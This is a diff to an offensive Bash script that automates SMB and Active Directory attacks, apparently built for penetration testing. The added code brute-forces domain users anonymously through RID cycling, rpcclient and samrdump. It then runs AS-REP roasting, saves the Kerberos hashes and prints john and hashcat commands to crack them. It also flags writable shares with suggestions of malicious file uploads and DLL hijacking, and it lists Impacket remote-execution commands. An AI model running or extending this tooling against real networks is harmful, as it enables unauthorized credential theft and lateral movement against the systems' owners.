@@ -220,6 +220,62 @@ if echo "$lookupsid_output" | grep -q "SidTypeUser\|SidTypeGroup"; then
     echo "nxc smb $IP -u $users_file -p 'Password123' --continue-on-success"
     echo ""
     
+    # Try alternative enumeration tools if lookupsid didn't find users
+else
+    echo -e "\n\033[93m[!] lookupsid.py didn't find users, trying alternative tools...\033[0m"
+fi
+
+# Alternative Tool 1: NetExec RID Brute (anonymous)
+echo -e "\n\033[96m[+] Trying NetExec RID Brute (anonymous)\033[0m"
+nxc_rid_output=$(timeout 15s nxc smb $IP -u '' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-anonymous.txt)
+echo "$nxc_rid_output"
+
+# Alternative Tool 2: rpcclient enumdomusers
+echo -e "\n\033[96m[+] Trying rpcclient enumdomusers (anonymous)\033[0m"
+rpcclient_output=$(rpcclient -U '' -N $IP -c 'enumdomusers' 2>/dev/null | tee nxc-enum/smb/rpcclient-enumdomusers.txt)
+echo "$rpcclient_output"
+
+# Alternative Tool 3: samrdump.py
+echo -e "\n\033[96m[+] Trying samrdump.py (anonymous)\033[0m"
+samrdump_output=$(timeout 15s samrdump.py $IP 2>/dev/null | tee nxc-enum/smb/samrdump-anonymous.txt)
+echo "$samrdump_output"
+
+# Alternative Tool 4: enum4linux (if installed)
+if command -v enum4linux &> /dev/null; then
+    echo -e "\n\033[96m[+] Trying enum4linux (anonymous)\033[0m"
+    timeout 30s enum4linux -U $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-users.txt
+fi
+
+# Check if we got users from any tool and create users file if not already created
+users_file_count=$(ls nxc-enum/smb/users_*.txt 2>/dev/null | wc -l)
+if [ "$users_file_count" -eq 0 ]; then
+    # Try to extract from alternative tools
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    users_file="nxc-enum/smb/users_${timestamp}.txt"
+    
+    # Try nxc output
+    if echo "$nxc_rid_output" | grep -q "SidTypeUser"; then
+        echo "$nxc_rid_output" | grep "SidTypeUser" | awk '{print $NF}' | grep -v '\$$' > "$users_file"
+    fi
+    
+    # Try rpcclient output
+    if [ ! -s "$users_file" ] && echo "$rpcclient_output" | grep -q "user:"; then
+        echo "$rpcclient_output" | grep "user:" | awk -F'[][]' '{print $2}' > "$users_file"
+    fi
+    
+    # If we got users, show them
+    if [ -s "$users_file" ]; then
+        echo -e "\n\033[92m[+] Extracted usernames from alternative tools: $users_file\033[0m"
+        echo "# Found $(wc -l < "$users_file") users"
+    fi
+else
+    # Users file already exists from lookupsid
+    users_file=$(ls -t nxc-enum/smb/users_*.txt 2>/dev/null | head -n1)
+fi
+
+# Continue with AS-REP roasting if we have a users file
+if [ -n "$users_file" ] && [ -s "$users_file" ]; then
+    
     # AS-REP Roasting with GetNPUsers.py
     echo -e "\n\033[96m[+] Checking for AS-REP Roastable users (GetNPUsers.py)\033[0m"
     
@@ -248,10 +304,24 @@ if echo "$lookupsid_output" | grep -q "SidTypeUser\|SidTypeGroup"; then
         
         # Check if any AS-REP roastable users were found
         if echo "$getnpusers_output" | grep -q '\$krb5asrep\$'; then
-            echo -e "\n\033[92m[+] AS-REP Roastable users found! Hashes saved to: nxc-enum/smb/asrep-getnpusers.txt\033[0m"
-            echo "# Crack with:"
-            echo "john --wordlist=/usr/share/wordlists/rockyou.txt nxc-enum/smb/asrep-getnpusers.txt"
-            echo "hashcat -m 18200 nxc-enum/smb/asrep-getnpusers.txt /usr/share/wordlists/rockyou.txt"
+            # Extract just the hashes to a clean file
+            grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt > nxc-enum/smb/asrep-hashes.txt
+            
+            # Extract vulnerable usernames
+            vulnerable_users=$(grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt | grep -oP '\$krb5asrep\$23\$\K[^@]+' | tr '\n' ', ' | sed 's/,$//')
+            
+            echo -e "\n\033[92m[+] AS-REP Roastable users found: $vulnerable_users\033[0m"
+            echo "# Full output: nxc-enum/smb/asrep-getnpusers.txt"
+            echo "# Clean hashes: nxc-enum/smb/asrep-hashes.txt"
+            echo ""
+            echo "# Crack with John the Ripper:"
+            echo "john --wordlist=/usr/share/wordlists/rockyou.txt nxc-enum/smb/asrep-hashes.txt"
+            echo ""
+            echo "# Or with Hashcat:"
+            echo "hashcat -m 18200 nxc-enum/smb/asrep-hashes.txt /usr/share/wordlists/rockyou.txt"
+            echo ""
+            echo "# Show cracked passwords:"
+            echo "john --show nxc-enum/smb/asrep-hashes.txt"
         fi
     else
         echo "# Could not auto-detect domain name"
@@ -375,6 +445,22 @@ check_and_suggest() {
                 # Since we are optimizing to run --shares in the main call, we use $output.
                 shares_output="$output"
                 
+                # Check for writable shares and display prominent notice
+                writable_shares=$(echo "$shares_output" | sed 's/\x1b\[[0-9;]*m//g' | grep "WRITE" | awk '{for(i=1;i<=NF;i++) if($i=="WRITE") print $(i-1)}' | sed 's/^\\\//')
+                if [ -n "$writable_shares" ]; then
+                    echo -e "\n\033[91m[!!!] WRITABLE SHARES FOUND - Potential for privilege escalation!\033[0m"
+                    echo -e "\033[93m[+] Writable shares:\033[0m"
+                    echo "$writable_shares" | while read -r share; do
+                        if [ ! -z "$share" ]; then
+                            echo "  - $share"
+                        fi
+                    done
+                    echo -e "\n\033[92m[+] Exploitation suggestions:\033[0m"
+                    echo "# Upload malicious files, DLL hijacking, or SCF/LNK attacks"
+                    echo "# Check for startup folders, scripts, or scheduled tasks"
+                    echo ""
+                fi
+                
                 echo -e "\n\033[92m[+] Suggested connections:\033[0m"
                 echo "$shares_output" | while read -r line; do
                     # Clean color codes for parsing
@@ -393,6 +479,20 @@ check_and_suggest() {
                         fi
                     fi
                 done
+                
+                # Add remote execution tool suggestions
+                echo -e "\n\033[92m[+] Remote execution tools:\033[0m"
+                if echo "$output" | grep -q "Pwn3d!"; then
+                    echo "# Admin access detected - these tools should work:"
+                    echo "wmiexec.py $IMPACKET_CREDS"
+                    echo "psexec.py $IMPACKET_CREDS"
+                    echo "smbexec.py $IMPACKET_CREDS"
+                    echo "atexec.py $IMPACKET_CREDS"
+                else
+                    echo "# No admin access - these tools may fail:"
+                    echo "wmiexec.py $IMPACKET_CREDS  # Requires admin"
+                    echo "psexec.py $IMPACKET_CREDS   # Requires admin"
+                fi
                 ;;
             "wmi")
                 if echo "$output" | grep -q "Pwn3d!"; then
